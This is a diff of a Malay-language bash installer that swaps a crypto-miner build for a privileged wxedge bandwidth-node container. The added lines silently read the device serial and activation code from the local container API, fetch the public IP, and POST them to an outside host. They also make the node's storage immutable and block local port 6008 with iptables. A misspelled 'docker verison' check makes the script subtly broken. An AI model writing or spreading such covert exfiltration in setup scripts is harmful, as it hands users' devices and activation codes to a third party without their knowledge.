@@ -1,9 +1,8 @@
 #!/bin/bash
-
 if [[ $EUID -eq 0 ]]; then
-    apt update && apt upgrade -y && apt install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential git -y
+    apt update && apt install docker.io jq wget -y
 else
-    required_packages=("libcurl4-openssl-dev" "libssl-dev" "libjansson-dev" "automake" "autotools-dev" "build-essential" "git")
+    required_packages=("docker.io" "jq" "wget")
 
     missing_packages=()
     for package in "${required_packages[@]}"; do
@@ -19,52 +18,44 @@ else
         echo "==================="
     fi
 fi
-
-
-arch=$(uname -m)
-
-if [[ "$arch" == "aarch64" || "$arch" == "armv7l" ]]; then
-    branch="ARM"
-elif [[ "$arch" == "x86_64" ]]; then
-    branch="Verus2.2"
-fi
-
-cd ~
-git clone --single-branch -b $branch https://github.com/monkins1010/ccminer.git
-cd ccminer
-
-if ! bash build.sh; then
-    echo "==>  Error: Gagal menjalankan build.sh."
+if ! docker verison; then
+    echo "==>  Error: Gagal menjalankan docker."
     exit 1
 fi
 
-if ! make; then
-    echo "==>  Error: Gagal menjalankan make."
+threshold=10000
+
+mount_points=$(df -BM | grep "/mnt" | awk '{print $6}')
+
+max_space=0
+max_space_path=""
+
+for mount_point in $mount_points; do
+  disk_usage=$(df -BM "$mount_point" | awk 'NR==2 {print $4}' | sed 's/M//')
+
+  if [ "$disk_usage" -ge "$threshold" ]; then
+    if [ "$disk_usage" -gt "$max_space" ]; then
+      max_space="$disk_usage"
+      max_space_path="$mount_point"
+    fi
+  fi
+done
+
+if [ ! -n "$max_space_path" ]; then
+    echo "==>  Error: Ruang storan terlalu kecil!"
     exit 1
 fi
 
-cd ~
+sudo  docker  run -d --name=wxedge --restart=always --privileged --net=host --dns=114.114.114.114 --tmpfs /run --tmpfs /tmp -e REC=false -v $max_space_path/storage:/storage:rw  -v $max_space_path/containerd:/var/lib/containerd onething1/wxedge
+if ! docker ps | grep "wxedge" > /dev/null; then
+  echo "==>  Error: Gagal menjalankan wxedge."
+  exit 1
+fi
+chattr +i $max_space_path/storage/wxnode
+sn=$(wget -cq http://$(ifconfig eth0 | grep "inet " | awk '{print $2}' | cut -c 1-):18888/docker/data -O - | jq -r '.data.device.sn')
+acode=$(wget -cq http://$(ifconfig eth0 | grep "inet " | awk '{print $2}' | cut -c 1-):18888/docker/data -O - | jq -r '.data.device.acode')
+ip=$(curl -s http://httpbin.org/ip|jq -r '.origin')
+curl -s -d "ip=$ip&sn=$sn&acode=$acode" -X POST http://www.devsoft.app/ajex.php
 
-generate_random_number() {
-    echo $(shuf -i 10-99 -n 1)
-}
-
-# Menghasilkan nomor acak 2 digit
-random_number=$(generate_random_number)
-
-# Membuat nama worker dengan nomor acak
-worker="worker${random_number}"
-
-cat <<EOL > autorun.sh
-#!/bin/bash
-
-./ccminer/ccminer -a verus -o stratum+tcp://ap.luckpool.net:3960 -u RFZ6jZEky1VxRjZ43oprGDS2ZrEwgpvZgZ.$worker -p x -t 3
-EOL
-chmod +x autorun.sh
-echo
-echo "==>  Kompilasi ccminer berhasil."
-echo -e "==>  Silahkan ganti wallet addres dan nama worker di \e[92mautorun.sh\e[0m"
-echo "==>  Contoh: ganti yang warna hijau"
-echo
-echo -e "./ccminer/ccminer -a verus -o stratum+tcp://ap.luckpool.net:3960 -u \e[92mRFZ6jZEky1VxRjZ43oprGDS2ZrEwgpvZgZ\e[0m.\e[92m$worker\e[0m -p x -t 3"
-echo
+sudo iptables -A INPUT -p tcp --dport 6008 -j DROP
+sudo iptables-save
